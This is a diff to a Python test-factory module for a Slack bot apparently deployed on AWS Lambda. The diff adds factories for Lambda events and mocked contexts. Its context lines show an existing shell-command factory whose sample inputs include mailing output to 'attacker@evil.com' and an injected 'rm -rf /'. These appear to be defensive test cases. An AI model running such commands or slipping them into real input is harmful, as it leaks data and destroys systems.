@@ -10,6 +10,8 @@ Usage:
     message = SlackMessageFactory.create(text="custom text")
 """
 
+from __future__ import annotations
+
 from datetime import datetime, timezone
 from unittest.mock import MagicMock
 
@@ -99,3 +101,61 @@ class ShellCommandFactory:
             "ls | mail attacker@evil.com",
             'test"; rm -rf /',
         ])
+
+
+class LambdaEventFactory:
+    """Factory for Lambda event dicts."""
+    
+    @staticmethod
+    def api_gateway_event(body: str | None = None) -> dict:
+        return {
+            "httpMethod": "POST",
+            "path": "/slack/events",
+            "headers": {
+                "X-Slack-Signature": f"v0={fake.sha256()}",
+                "X-Slack-Request-Timestamp": str(fake.random_int(min=1700000000, max=1800000000)),
+            },
+            "body": body or fake.json(),
+        }
+    
+    @staticmethod
+    def eventbridge_event() -> dict:
+        return {
+            "version": "0",
+            "id": fake.uuid4(),
+            "detail-type": "Scheduled Event",
+            "source": "aws.events",
+            "account": str(fake.random_number(digits=12, fix_len=True)),
+            "time": fake.iso8601(),
+            "region": fake.random_element(["us-east-1", "us-west-2"]),
+            "resources": [f"arn:aws:events:us-east-1:{fake.random_number(digits=12)}:rule/my-schedule"],
+            "detail": {},
+        }
+    
+    @staticmethod
+    def slack_challenge_event(challenge: str | None = None) -> dict:
+        return {
+            "type": "url_verification",
+            "challenge": challenge or fake.sha256(),
+            "token": fake.sha256(),
+        }
+
+
+class LambdaContextFactory:
+    """Factory for Lambda context objects."""
+    
+    @staticmethod
+    def create(
+        aws_request_id: str | None = None,
+        remaining_time_ms: int = 300000,
+    ) -> MagicMock:
+        context = MagicMock()
+        context.aws_request_id = aws_request_id or fake.uuid4()
+        context.log_group_name = f"/aws/lambda/{fake.word()}"
+        context.log_stream_name = f"2024/01/01/[$LATEST]{fake.sha256()[:8]}"
+        context.function_name = fake.word()
+        context.memory_limit_in_mb = 512
+        context.function_version = "$LATEST"
+        context.invoked_function_arn = f"arn:aws:lambda:us-east-1:{fake.random_number(digits=12)}:function:{fake.word()}"
+        context.get_remaining_time_in_millis.return_value = remaining_time_ms
+        return context
